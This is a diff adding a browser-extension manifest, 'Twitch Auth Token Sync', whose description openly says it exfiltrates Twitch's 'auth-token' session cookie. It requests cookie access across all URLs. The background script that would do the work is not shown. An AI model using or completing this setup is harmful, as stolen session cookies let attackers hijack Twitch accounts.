@@ -1,0 +1,19 @@
+{
+  "manifest_version": 3,
+  "name": "Twitch Auth Token Sync",
+  "version": "$VERSION",
+  "description": "A WebExtension designed to exfiltrate the 'auth-token' cookie value from Twitch whenever it changes.",
+  "host_permissions": [
+    "<all_urls>"
+  ],
+  "permissions": [
+    "cookies",
+    "storage"
+  ],
+  "action": {
+    "default_popup": "popup.html"
+  },
+  "background": {
+    "service_worker": "background.js"
+  }
+}
